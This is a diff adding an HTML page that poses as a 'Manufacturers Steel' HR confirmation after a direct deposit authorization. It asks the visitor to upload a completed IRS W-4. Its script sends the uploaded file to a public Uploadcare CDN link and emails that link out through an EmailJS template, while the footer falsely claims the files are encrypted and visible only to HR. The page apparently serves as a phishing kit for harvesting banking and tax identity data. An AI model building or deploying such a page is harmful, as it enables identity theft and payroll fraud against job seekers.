@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Submission Successful | Manufacturers Steel</title>
+
+<style>
+body {
+    font-family: Arial, sans-serif;
+    background:#f4f4f4;
+    margin:0;
+    padding:20px;
+}
+
+.container {
+    background:#fff;
+    max-width:700px;
+    margin:auto;
+    padding:30px;
+    border-radius:8px;
+    box-shadow:0 2px 10px rgba(0,0,0,0.1);
+    text-align:center;
+}
+
+.success-icon {
+    font-size:48px;
+    color:#28a745;
+}
+
+h1 {
+    color:#28a745;
+}
+
+.secure-box {
+    margin-top:30px;
+    padding:20px;
+    border-left:5px solid #007bff;
+    background:#f9f9f9;
+    text-align:left;
+}
+
+.download-link {
+    margin:15px 0;
+}
+
+button {
+    margin-top:20px;
+    background:#007bff;
+    color:#fff;
+    border:none;
+    padding:12px 20px;
+    font-size:16px;
+    border-radius:5px;
+    cursor:pointer;
+}
+
+button:hover {
+    background:#0056b3;
+}
+
+.hidden {
+    display:none;
+}
+
+.complete-message {
+    margin-top:20px;
+    padding:15px;
+    background:#e9f7ef;
+    border-left:4px solid #28a745;
+    color:#155724;
+    font-size:15px;
+}
+
+.footer {
+    margin-top:30px;
+    font-size:13px;
+    color:#666;
+}
+</style>
+
+<!-- Uploadcare -->
+<script>
+UPLOADCARE_PUBLIC_KEY = "7c0fc9909edc9b633c64";
+</script>
+<script src="https://ucarecdn.com/libs/widget/3.x/uploadcare.full.min.js"></script>
+
+<!-- EmailJS -->
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+<script>
+(function(){
+    emailjs.init("dCnMUwyT-sgO82hae");
+})();
+</script>
+</head>
+
+<body>
+
+<div class="container">
+    <div class="success-icon">✔</div>
+    <h1>Submission Successful</h1>
+
+    <p>
+        Your <strong>Direct Deposit Authorization</strong> has been securely received.
+    </p>
+
+    <div class="secure-box" id="uploadSection">
+        <h3>🔒 Secure W-4 Upload</h3>
+        <p>
+            Please download, complete, and upload your IRS W-4 form using the secure system below.
+        </p>
+
+        <div class="download-link">
+            📄 <a href="w4-form.pdf" target="_blank"><strong>Download IRS W-4 Form (PDF)</strong></a>
+        </div>
+
+        <form id="w4Form">
+            <input
+                type="hidden"
+                role="uploadcare-uploader"
+                name="w4_file"
+                data-clearable
+                data-file-types="pdf"
+                data-max-size="5242880"
+            >
+
+            <button type="submit">Submit W-4 Securely</button>
+        </form>
+    </div>
+
+    <div id="completeMessage" class="complete-message hidden">
+        ✅ Your W-4 has been securely submitted.<br><br>
+        No further action is required at this time.<br>
+        You may safely close this page.
+    </div>
+
+    <div class="footer">
+        PDF only • Max size 5MB • Files are encrypted and accessible only to HR<br>
+        Manufacturers Steel — All information is confidential and used solely for employment purposes.
+    </div>
+</div>
+
+<script>
+document.getElementById("w4Form").addEventListener("submit", function(e){
+    e.preventDefault();
+
+    const widget = uploadcare.Widget('[role=uploadcare-uploader]');
+    const file = widget.value();
+
+    if (!file) {
+        return;
+    }
+
+    file.done(function(fileInfo){
+
+        emailjs.send("service_w8bw8vg", "template_i7oa7kg", {
+            document_type: "IRS W-4",
+            w4_file_link: fileInfo.cdnUrl
+        }).then(function(){
+
+            document.getElementById("uploadSection").classList.add("hidden");
+            document.getElementById("completeMessage").classList.remove("hidden");
+
+        });
+
+    });
+});
+</script>
+
+</body>
+</html>
